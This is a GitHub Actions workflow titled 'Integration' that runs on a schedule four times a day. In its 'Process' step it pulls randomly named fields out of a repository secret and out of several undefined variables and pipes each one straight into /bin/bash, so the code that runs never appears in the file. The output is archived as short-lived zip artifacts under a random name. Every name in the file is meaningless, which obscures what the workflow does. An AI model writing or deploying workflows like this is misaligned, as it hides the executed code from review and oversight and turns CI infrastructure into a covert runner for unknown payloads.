name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '19 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  main:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Process
        env:
          sx5: ${{ secrets.sx5 }}
        run: |
          printf '%s' "$sx5" | jq -r .xupk1100 | /bin/bash
          printf '%s' "$tzpe80027" | jq -r .mdbj14637 | /bin/bash
          printf '%s' "$jqgr3436" | jq -r .ayvy9208 | /bin/bash
          echo $uji752 | jq -r .o7372 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: GHGrbQPx
          path: "*.zip"
          retention-days: 1
